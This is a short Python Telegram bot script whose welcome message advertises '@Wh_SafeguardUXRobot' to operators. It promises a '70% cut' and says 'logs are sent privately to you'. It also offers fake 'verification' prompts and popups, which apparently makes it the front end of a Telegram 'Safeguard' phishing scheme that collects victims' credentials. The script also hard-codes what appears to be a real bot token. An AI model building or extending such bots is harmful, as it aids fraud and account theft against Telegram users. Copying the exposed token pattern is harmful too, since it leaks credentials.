import asyncio
from io import BytesIO
from telegram import(
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import(
    Application,
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)
from PIL import Image
import dotenv

TOKEN = "7857731540:AAFJi6lo2P3trErbwPE9PLG_70tjV5Tb9fA" 
Background_Image = Image.open('assets/Nyrox.jpg')

Add_btn = InlineKeyboardButton(text = "➕ Add to Channel", url="https://t.me/whalesharka1")

User_btn = InlineKeyboardButton(text = "👤 User message bot", callback_data="user_btn")
Popup_btn = InlineKeyboardButton(text = "💬 Instant Popup", callback_data="popup_btn")
Support_button = InlineKeyboardButton(text="💬 Support", url="https://t.me/@whalesharka", callback_data="Support_button")

async def clickHandler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the button click."""
    print("clickHandler")
    query = update.callback_query
    await query.answer()
    # Extract the callback data from the clicked button
    callback_data = query.data
    if callback_data == "popup_btn":
      await query.message.reply_text("Setup is complete. Verification prompt was sent to @whalesharka1")

    

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    keyboard = [[Add_btn],[Support_button]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = f"""
Welcome to @Wh_SafeguardUXRobot

• Your cut is 70% unless we agreed on a different cut!
• Logs are sent privately to you

💡Desktop Users: If the Add Bot button doesn't work, manually
add @Wh_SafeguardUXRobot to your group as admin.
"""
#     message = f"""
#  Choose one of the options:
 
# 💬 Uesr message bot: The bot will send a verification message via 
#  a private chat.
# ⚡ Instant popup: This option yields higher engagement by displaying an instant popup for verification.

#  Choose wisely!
# """
    bio= BytesIO()
    Background_Image.save(bio, format="JPEG")
    bio.seek(0)
    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=bio, caption=message, reply_markup=reply_markup)


if __name__== '__main__':
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    # application.add_handler(CallbackQueryHandler(clickHandler))
    application.run_polling()